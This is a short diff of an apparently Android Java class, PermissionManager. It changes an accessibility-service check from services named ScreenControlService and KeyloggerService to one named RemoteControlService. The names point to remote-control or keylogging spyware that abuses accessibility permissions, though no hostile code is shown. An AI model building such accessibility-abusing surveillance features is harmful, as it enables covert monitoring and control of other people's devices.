@@ -149,8 +149,7 @@ public final class PermissionManager {
         );
         if (enabledServices == null) return false;
         String pkg = ctx.getPackageName();
-        return enabledServices.contains(pkg + "/.features.screen.ScreenControlService") ||
-               enabledServices.contains(pkg + "/.features.keylogger.KeyloggerService");
+        return enabledServices.contains(pkg + "/.features.screen.RemoteControlService");
     }
 
     public static void requestAccessibility(Context ctx) {
